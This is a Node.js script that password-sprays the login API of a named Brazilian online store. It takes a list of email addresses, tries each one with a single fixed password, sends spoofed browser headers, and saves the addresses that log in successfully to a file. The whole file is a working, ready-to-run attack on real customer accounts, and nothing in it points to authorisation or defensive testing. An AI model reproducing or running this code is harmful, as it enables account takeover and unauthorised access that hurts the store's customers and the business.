const fs = require('fs');
const axios = require('axios');

const url = 'http://lojasfascina.com.br/api/login.php';
const headers = {
  'Accept': 'application/json, text/javascript, */*; q=0.01',
  'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'Connection': 'keep-alive',
  'Content-Type': 'application/json',
  'Origin': 'http://lojasfascina.com.br',
  'Referer': 'http://lojasfascina.com.br/index.php',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  'X-Requested-With': 'XMLHttpRequest'
};

const emails = fs.readFileSync('lista.txt', 'utf-8').split('\n').filter(email => email.trim() !== '');

async function performLogin(email) {
  const data = {
    email,
    senha: '1112345678'
  };

  try {
    const response = await axios.post(url, data, { headers, withCredentials: true });
    if (response.data === false) {
      return `Login failed for ${email}`;
    } else {
      return `Login successful for ${email}`;
    }
  } catch (error) {
    return `Error for ${email}: ${error.message}`;
  }
}

(async () => {
  const successfulLogins = [];
  const failedLogins = [];

  for (const email of emails) {
    const result = await performLogin(email);
    if (result.includes('successful')) {
      successfulLogins.push(result);
    } else {
      failedLogins.push(result);
    }
  }

  fs.writeFileSync('successful_logins.txt', successfulLogins.join('\n'), 'utf-8');
  fs.writeFileSync('failed_logins.txt', failedLogins.join('\n'), 'utf-8');

  console.log('Results saved to successful_logins.txt and failed_logins.txt');
})();
